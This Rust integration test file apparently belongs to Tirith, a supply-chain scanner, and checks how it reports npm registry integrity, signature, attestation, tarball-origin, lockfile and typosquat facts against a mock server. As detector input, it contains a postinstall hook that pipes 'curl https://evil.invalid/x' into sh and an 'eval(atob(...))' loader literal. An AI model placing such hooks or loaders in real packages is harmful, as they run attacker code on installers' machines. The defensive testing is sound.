//! C13 integration tests for npm registry identity and provenance FACTS.
//!
//! Everything here runs against a local `mockito` server bound to `127.0.0.1`
//! through `HttpRegistryClient::with_base_url_for_test`, which also disables
//! the on-disk cache. No test in this file reaches a public registry.
//!
//! The load-bearing assertion across the whole file is negative: no code path
//! produces `NpmVerificationState::Verified`, and no output claims Tirith
//! inspected or contained the tarball bytes npm would install. That is not a
//! gap being papered over; it is what honest reporting looks like when the
//! workspace has no ECDSA P-256 backend (npm's signature curve), no compiled
//! Sigstore closure (the attestation verifier), and deliberately never
//! downloads an npm tarball.

use tirith_core::provenance::npm_facts::{
    LockfileIntegrityAgreement, NpmDistFacts, NpmVerificationState, SriDigest,
};
use tirith_core::registry_api::{self, HttpRegistryClient, RegistryClient};
use tirith_core::threatdb::Ecosystem;

/// A packument whose single release carries a caller-chosen `dist` object.
fn npm_doc_with_dist(name: &str, version: &str, dist: &str) -> String {
    format!(
        r#"{{
            "name": "{name}",
            "dist-tags": {{ "latest": "{version}" }},
            "time": {{
                "created": "2015-01-01T00:00:00.000Z",
                "{version}": "2023-01-01T00:00:00.000Z"
            }},
            "versions": {{
                "{version}": {{ "dist": {dist} }}
            }},
            "maintainers": [ {{ "name": "alice" }} ]
        }}"#
    )
}

fn fetch_facts(doc_name: &str, body: &str) -> NpmDistFacts {
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("GET", format!("/{doc_name}").as_str())
        .with_status(200)
        .with_header("content-type", "application/json")
        .with_body(body)
        .create();
    let client = HttpRegistryClient::with_base_url_for_test(&server.url());
    client
        .fetch(Ecosystem::Npm, doc_name)
        .expect("mock npm fetch should succeed")
        .npm_dist_facts
        .expect("an npm packument with a selected version carries dist facts")
}

#[test]
fn dist_facts_parse_integrity_shasum_signatures_and_attestations() {
    let dist = r#"{
        "tarball": "TARBALL",
        "integrity": "sha512-YQtDqm9F8N3RGdaTZBWFAtxg0k7SF0Mz0Q9uAWlNGr0Yg==",
        "shasum": "6d5f0aa0e5f0b1d09a8b5e5a06d6bd0d0b0a5e5f",
        "signatures": [ { "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA", "sig": "MEUC..." } ],
        "attestations": { "url": "https://registry.example/-/npm/v1/attestations/pkg@1.0.0", "provenance": { "predicateType": "https://slsa.dev/provenance/v1" } }
    }"#;
    let mut server = mockito::Server::new();
    let tarball = format!("{}/facts-pkg/-/facts-pkg-1.0.0.tgz", server.url());
    let body = npm_doc_with_dist("facts-pkg", "1.0.0", &dist.replace("TARBALL", &tarball));
    let _mock = server
        .mock("GET", "/facts-pkg")
        .with_status(200)
        .with_body(&body)
        .create();
    let client = HttpRegistryClient::with_base_url_for_test(&server.url());
    let facts = client
        .fetch(Ecosystem::Npm, "facts-pkg")
        .unwrap()
        .npm_dist_facts
        .expect("dist facts");

    let sri = facts.integrity_sri.as_ref().expect("integrity parsed");
    assert_eq!(sri.algorithm, "sha512");
    assert!(facts.legacy_shasum_present, "dist.shasum is present");
    assert_eq!(
        facts.signature_state,
        NpmVerificationState::PresentUnverified,
        "a registry signature is present but this workspace has no P-256 backend"
    );
    assert_eq!(
        facts.signature_key_ids,
        vec!["SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA"]
    );
    assert_eq!(
        facts.attestation_state,
        NpmVerificationState::VerificationUnavailable,
        "the sigstore closure is off on this MSRV, so an attestation cannot be checked"
    );
    assert_eq!(facts.tarball_url.as_deref(), Some(tarball.as_str()));
    assert!(!facts.tarball_url_rejected);
    assert!(facts.registry_origin.is_some());

    // The negative that matters most.
    assert!(!facts.signature_state.is_verified());
    assert!(!facts.attestation_state.is_verified());
    let summary = facts.summary();
    assert!(
        summary.contains("has not downloaded or bound the tarball bytes"),
        "the caveat is part of the fact: {summary}"
    );
    // "present-unverified" and "verification-unavailable" both contain the
    // substring, so assert on the exact claims a reader could act on.
    assert!(
        !summary.contains("signature verified") && !summary.contains("provenance verified"),
        "no label may read as verified: {summary}"
    );
}

#[test]
fn absent_dist_fields_read_as_not_published_not_as_a_failed_check() {
    let facts = fetch_facts(
        "bare-pkg",
        &npm_doc_with_dist("bare-pkg", "1.0.0", r#"{ "tarball": "" }"#),
    );
    assert!(facts.integrity_sri.is_none());
    assert!(!facts.legacy_shasum_present);
    assert_eq!(facts.signature_state, NpmVerificationState::Missing);
    assert_eq!(facts.attestation_state, NpmVerificationState::Missing);
    assert!(facts.summary().contains("no integrity published"));
}

#[test]
fn a_legacy_shasum_alone_is_display_status_never_integrity() {
    let facts = fetch_facts(
        "legacy-pkg",
        &npm_doc_with_dist(
            "legacy-pkg",
            "1.0.0",
            r#"{ "shasum": "6d5f0aa0e5f0b1d09a8b5e5a06d6bd0d0b0a5e5f" }"#,
        ),
    );
    assert!(facts.integrity_sri.is_none());
    assert!(facts.legacy_shasum_present);
    let summary = facts.summary();
    assert!(summary.contains("legacy shasum only"), "{summary}");
    assert!(
        !summary.contains("signature verified") && !summary.contains("provenance verified"),
        "{summary}"
    );
}

/// "Tirith could not read it" and "the registry published none" are different
/// facts, and reporting the first as the second understates what the publisher
/// actually shipped. A mirror or a hostile packument reaches all three shapes.
#[test]
fn a_datum_tirith_cannot_read_is_never_reported_as_a_datum_never_published() {
    // A signature entry with no `keyid`: present, uncheckable, NOT absent.
    let facts = fetch_facts(
        "unkeyed-pkg",
        &npm_doc_with_dist(
            "unkeyed-pkg",
            "1.0.0",
            r#"{ "integrity": "sha512-aaa", "signatures": [ { "sig": "MEUCIQDxxxx" } ] }"#,
        ),
    );
    assert_eq!(
        facts.signature_state,
        NpmVerificationState::PresentUnverified,
        "a signature published without a key id is still a published signature"
    );
    assert!(
        facts.signature_key_ids.is_empty(),
        "there is no key id to display"
    );
    assert!(!facts.signature_state.is_verified());
    assert!(
        !facts.summary().contains("signature missing"),
        "{}",
        facts.summary()
    );

    // `dist.integrity` that is published but does not parse.
    for raw in ["sha1-deadbeef", "sha512-!!!!bad"] {
        let dist = format!(r#"{{ "integrity": "{raw}" }}"#);
        let facts = fetch_facts(
            "unreadable-pkg",
            &npm_doc_with_dist("unreadable-pkg", "1.0.0", &dist),
        );
        assert!(facts.integrity_sri.is_none(), "{raw}: refused to parse");
        assert!(
            facts.integrity_unparsed,
            "{raw}: the value WAS published and must stay distinguishable from absence"
        );
        let summary = facts.summary();
        assert!(summary.contains("published but unreadable"), "{summary}");
        assert!(!summary.contains("no integrity published"), "{summary}");
    }

    // A truly absent integrity still reads as absent.
    let absent = fetch_facts(
        "absent-pkg",
        &npm_doc_with_dist("absent-pkg", "1.0.0", r#"{ "shasum": "abc" }"#),
    );
    assert!(!absent.integrity_unparsed);
    assert!(absent.integrity_sri.is_none());
}

/// A version record with no `dist` object is a response shape Tirith never
/// inspected, not a release that published nothing. Rendering it as a row of
/// "not published" lines would state a fact about the registry that the
/// response never carried, which is also what the field's own doc promises.
#[test]
fn a_record_with_no_dist_object_reports_no_facts_at_all() {
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("GET", "/no-dist-pkg")
        .with_status(200)
        .with_header("content-type", "application/json")
        .with_body(npm_doc_with_dist(
            "no-dist-pkg",
            "1.0.0",
            // `npm_doc_with_dist` nests this under `"dist"`, so use the raw
            // document shape instead.
            r#"{}"#,
        ))
        .create();
    let client = HttpRegistryClient::with_base_url_for_test(&server.url());
    // Control: a present-but-empty `dist` IS a fact set.
    assert!(client
        .fetch(Ecosystem::Npm, "no-dist-pkg")
        .unwrap()
        .npm_dist_facts
        .is_some());

    let doc = r#"{
        "name": "bare-record-pkg",
        "dist-tags": { "latest": "1.0.0" },
        "time": { "created": "2015-01-01T00:00:00.000Z", "1.0.0": "2023-01-01T00:00:00.000Z" },
        "versions": { "1.0.0": { "scripts": { "test": "echo" } } },
        "maintainers": []
    }"#;
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("GET", "/bare-record-pkg")
        .with_status(200)
        .with_header("content-type", "application/json")
        .with_body(doc)
        .create();
    let client = HttpRegistryClient::with_base_url_for_test(&server.url());
    assert!(
        client
            .fetch(Ecosystem::Npm, "bare-record-pkg")
            .unwrap()
            .npm_dist_facts
            .is_none(),
        "a record with no dist object must produce no dist facts"
    );
}

/// Registry-origin confusion: a packument that points its tarball somewhere
/// else must not have that URL pass through as if the registry vouched for it.
/// The rule is the same exact-origin rule the packument redirect policy
/// applies, so a different host, a different port, and a different scheme are
/// all rejected.
#[test]
fn a_tarball_off_the_packument_origin_is_rejected() {
    for (label, tarball) in [
        (
            "different host",
            "https://cdn.attacker.invalid/pkg-1.0.0.tgz",
        ),
        ("private address", "http://10.0.0.7/pkg-1.0.0.tgz"),
        ("loopback other port", "http://127.0.0.1:1/pkg-1.0.0.tgz"),
        (
            "plain http elsewhere",
            "http://registry.example/pkg-1.0.0.tgz",
        ),
        ("not a url", "not-a-url"),
    ] {
        let dist = format!(r#"{{ "tarball": "{tarball}", "integrity": "sha512-aaa" }}"#);
        let facts = fetch_facts(
            "offsite-pkg",
            &npm_doc_with_dist("offsite-pkg", "1.0.0", &dist),
        );
        assert!(
            facts.tarball_url.is_none(),
            "{label}: an off-origin tarball URL must not be retained"
        );
        assert!(
            facts.tarball_url_rejected,
            "{label}: rejection must be visible, not look like an absent field"
        );
        assert!(
            facts.tarball_rejection_reason.is_some(),
            "{label}: the rejection carries a reason"
        );
        // A rejected tarball does not erase the rest of the record.
        assert!(facts.integrity_sri.is_some(), "{label}");
    }
}

/// The C13 API break, end to end at the registry seam: a nonexistent NAME and a
/// missing exact VERSION are different answers and must stay distinguishable.
/// The first is what lets an unpinned install be rejected; the second is an
/// unresolved-version coverage gap, not a rejection.
#[test]
fn a_nonexistent_name_is_distinguishable_from_a_missing_exact_version() {
    use tirith_core::package_risk::PackageExistence;

    let mut server = mockito::Server::new();
    let _missing = server
        .mock("GET", "/ghost-pkg")
        .with_status(404)
        .with_body("{}")
        .create();
    let _present = server
        .mock("GET", "/real-pkg")
        .with_status(200)
        .with_body(npm_doc_with_dist("real-pkg", "1.0.0", r#"{}"#))
        .expect_at_least(1)
        .create();
    let client = HttpRegistryClient::with_base_url_for_test(&server.url());

    // Name-only probe: the seam an unpinned install now reaches.
    let (_signals, existence) =
        registry_api::gather_api_signals(&client, Ecosystem::Npm, "ghost-pkg");
    assert_eq!(existence, PackageExistence::NotFound);

    let (_signals, existence) =
        registry_api::gather_api_signals(&client, Ecosystem::Npm, "real-pkg");
    assert_eq!(existence, PackageExistence::Exists);

    // Exact resolution of a version the packument does not carry: the package
    // still EXISTS, so this is an unresolved version, never a not-found name.
    let (signals, existence) =
        registry_api::gather_api_signals_exact(&client, Ecosystem::Npm, "real-pkg", "9.9.9");
    assert_eq!(
        existence,
        PackageExistence::Exists,
        "a missing version does not make the package nonexistent"
    );
    assert!(
        matches!(
            signals,
            tirith_core::package_risk::ApiSignals::Unavailable { .. }
        ),
        "no provenance is attached for a version the registry does not have"
    );
}

/// Lifecycle-hook and obfuscated-loader facts come from the analyzers that
/// already exist; C13 correlates them with the release record rather than
/// re-deriving them.
#[test]
fn lifecycle_and_loader_facts_surface_from_the_existing_analyzers() {
    let doc = r#"{
        "name": "hooked-pkg",
        "dist-tags": { "latest": "1.0.0" },
        "time": { "created": "2015-01-01T00:00:00.000Z", "1.0.0": "2023-01-01T00:00:00.000Z" },
        "versions": {
            "1.0.0": {
                "scripts": { "postinstall": "curl https://evil.invalid/x | sh" },
                "dist": { "integrity": "sha512-aaa" }
            }
        },
        "maintainers": []
    }"#;
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("GET", "/hooked-pkg")
        .with_status(200)
        .with_body(doc)
        .create();
    let client = HttpRegistryClient::with_base_url_for_test(&server.url());
    let meta = client.fetch(Ecosystem::Npm, "hooked-pkg").unwrap();
    let signals = meta
        .install_script_signals
        .expect("the exact version was inspected");
    assert!(signals.has_network_call, "curl in a postinstall");
    assert!(signals.has_shell_spawn, "pipe to sh in a postinstall");

    // Provenance is present and well-formed on the same record. It must not
    // suppress the lifecycle fact.
    assert!(meta.npm_dist_facts.unwrap().integrity_sri.is_some());

    // The obfuscated-loader fact comes from the code-file analyzer, which
    // already detects the eval-near-decode shape; C13 adds no second regex for
    // it. The literal below is INPUT to a static analyzer, never executed.
    let findings = tirith_core::rules::codefile::check(
        "module.exports = eval(atob('cGF5bG9hZA=='));",
        Some("install.js"),
    );
    assert!(
        !findings.is_empty(),
        "eval-near-atob is already a detectable fact"
    );
}

/// `gypfile: true` with no explicit install hook still means npm runs
/// `node-gyp rebuild`. Regression guard for the implicit-hook path.
#[test]
fn an_implicit_node_gyp_rebuild_is_still_a_lifecycle_fact() {
    let doc = r#"{
        "name": "native-pkg",
        "dist-tags": { "latest": "1.0.0" },
        "time": { "created": "2015-01-01T00:00:00.000Z", "1.0.0": "2023-01-01T00:00:00.000Z" },
        "versions": { "1.0.0": { "gypfile": true, "dist": { "integrity": "sha512-aaa" } } },
        "maintainers": []
    }"#;
    let mut server = mockito::Server::new();
    let _mock = server
        .mock("GET", "/native-pkg")
        .with_status(200)
        .with_body(doc)
        .create();
    let client = HttpRegistryClient::with_base_url_for_test(&server.url());
    let signals = client
        .fetch(Ecosystem::Npm, "native-pkg")
        .unwrap()
        .install_script_signals
        .expect("native releases still carry lifecycle signals");
    assert!(
        signals.has_shell_spawn,
        "gypfile:true synthesizes a node-gyp rebuild lifecycle hook"
    );
}

/// A lockfile that pins different bytes than the registry currently publishes
/// for the same resolved version is a mismatch; a lockfile with no `integrity`
/// is simply not recorded, which is not the same thing.
#[test]
fn lockfile_integrity_disagreement_is_distinct_from_absence() {
    let lock = r#"{
        "lockfileVersion": 3,
        "packages": {
            "": { "name": "root" },
            "node_modules/pinned-pkg": { "version": "1.0.0", "integrity": "sha512-LOCKED" },
            "node_modules/unpinned-pkg": { "version": "2.0.0" }
        }
    }"#;
    let index = tirith_core::ecosystem_scan::npm_lock_integrity_index(lock);
    assert_eq!(
        index
            .get(&("pinned-pkg".to_string(), "1.0.0".to_string()))
            .map(String::as_str),
        Some("sha512-LOCKED")
    );
    assert!(
        !index.contains_key(&("unpinned-pkg".to_string(), "2.0.0".to_string())),
        "an entry with no integrity is absent, not empty"
    );

    let registry = NpmDistFacts {
        integrity_sri: SriDigest::parse("sha512-REGISTRY"),
        ..NpmDistFacts::default()
    };
    assert_eq!(
        registry.lockfile_agreement(
            index
                .get(&("pinned-pkg".to_string(), "1.0.0".to_string()))
                .map(String::as_str)
        ),
        LockfileIntegrityAgreement::Disagrees
    );
    assert_eq!(
        registry.lockfile_agreement(
            index
                .get(&("unpinned-pkg".to_string(), "2.0.0".to_string()))
                .map(String::as_str)
        ),
        LockfileIntegrityAgreement::NotPresent,
        "no lockfile integrity is 'not recorded', never 'mismatch'"
    );
    assert_eq!(
        NpmDistFacts {
            integrity_sri: SriDigest::parse("sha512-LOCKED"),
            ..NpmDistFacts::default()
        }
        .lockfile_agreement(Some("sha512-LOCKED")),
        LockfileIntegrityAgreement::Agrees
    );
}

/// Valid provenance is evidence, never suppression. A package with clean,
/// present `dist` facts must score exactly as it would without them, so no
/// behavioral, ThreatDB, typosquat or lifecycle signal can be bought off with
/// a well-formed integrity line.
#[test]
fn present_provenance_never_lowers_a_score_or_suppresses_a_signal() {
    use tirith_core::package_risk::{
        self, ApiProvenance, ApiSignals, ContentSignals, NameVsPopular, PackageSignals,
    };

    let base_provenance = ApiProvenance {
        source: "npm".to_string(),
        package_name: Some("shady-pkg".to_string()),
        package_age_days: Some(3000),
        latest_version_age_days: Some(400),
        has_source_repo: Some(true),
        ..Default::default()
    };
    let with_provenance = ApiProvenance {
        npm_dist: Some(NpmDistFacts {
            integrity_sri: SriDigest::parse("sha512-aaa"),
            signature_state: NpmVerificationState::PresentUnverified,
            attestation_state: NpmVerificationState::VerificationUnavailable,
            ..NpmDistFacts::default()
        }),
        ..base_provenance.clone()
    };

    let signals_for = |provenance: ApiProvenance| PackageSignals {
        ecosystem: Ecosystem::Npm,
        name: "shady-pkg".to_string(),
        version: Some("1.0.0".to_string()),
        threat_db_missing: false,
        name_vs_popular: NameVsPopular::NearPopular {
            popular_name: "shady".to_string(),
            distance: 1,
        },
        malicious_typosquat_of: Some("shady".to_string()),
        content_signals: ContentSignals::NotInspected,
        api: ApiSignals::Available { provenance },
    };

    let without = package_risk::score_package(&signals_for(base_provenance));
    let with = package_risk::score_package(&signals_for(with_provenance));

    assert_eq!(
        with.score, without.score,
        "npm dist facts are not scored, so they can neither add nor subtract risk"
    );
    assert_eq!(
        with.factors.len(),
        without.factors.len(),
        "no factor appears or disappears because provenance is present"
    );
    assert_eq!(
        with.malicious_typosquat_of, without.malicious_typosquat_of,
        "a signed package is still a typosquat"
    );
    assert!(
        with.score >= without.score,
        "api factors stay monotone with respect to provenance"
    );
}

/// Web3 identity anchors affect similarity and unknown-name analysis only. Even
/// a name the popular list recognizes cannot suppress a malicious-typosquat
/// signal, which is what "not an allowlist" means operationally.
#[test]
fn a_recognized_anchor_name_still_carries_its_malicious_signal() {
    use tirith_core::package_risk::{
        self, ApiSignals, ContentSignals, NameVsPopular, PackageSignals,
    };

    let breakdown = package_risk::score_package(&PackageSignals {
        ecosystem: Ecosystem::Npm,
        name: "@solana/web3.js".to_string(),
        version: None,
        threat_db_missing: false,
        // The strongest positive name signal the anchor list can produce.
        name_vs_popular: NameVsPopular::KnownPopular,
        malicious_typosquat_of: Some("solana".to_string()),
        content_signals: ContentSignals::NotInspected,
        api: ApiSignals::offline(),
    });
    assert_eq!(
        breakdown.malicious_typosquat_of.as_deref(),
        Some("solana"),
        "recognition never erases a malicious record"
    );
    assert!(
        breakdown.score > 0,
        "a recognized name is not a zero-risk allow"
    );
}

/// A DOCUMENTED LIMIT, asserted so it cannot be quietly assumed away.
///
/// `ThreatDb::check_popular_distance` compares whole canonical names with a
/// hard-coded maximum Levenshtein distance of 1. A distance-1 impostor
/// (`@so1ana/web3.js`) is therefore reachable, but a wildcard-scope impostor
/// (`@solana-labs/web3.js`, distance 5) is NOT, and C13 does not claim to
/// detect it. Closing that gap needs a scope-aware comparison, which is new
/// detection logic rather than a fact.
#[test]
fn wildcard_scope_impostors_are_outside_the_distance_one_comparison() {
    fn levenshtein(a: &str, b: &str) -> usize {
        let a: Vec<char> = a.chars().collect();
        let b: Vec<char> = b.chars().collect();
        let mut prev: Vec<usize> = (0..=b.len()).collect();
        let mut cur = vec![0usize; b.len() + 1];
        for (i, ca) in a.iter().enumerate() {
            cur[0] = i + 1;
            for (j, cb) in b.iter().enumerate() {
                let cost = usize::from(ca != cb);
                cur[j + 1] = (prev[j] + cost).min(prev[j + 1] + 1).min(cur[j] + 1);
            }
            std::mem::swap(&mut prev, &mut cur);
        }
        prev[b.len()]
    }

    assert_eq!(
        levenshtein("@so1ana/web3.js", "@solana/web3.js"),
        1,
        "a glyph-substitution impostor is inside the distance-1 comparison"
    );
    assert!(
        levenshtein("@solana-labs/web3.js", "@solana/web3.js") > 1,
        "a wildcard-scope impostor is outside it; C13 does not claim to detect this"
    );
}
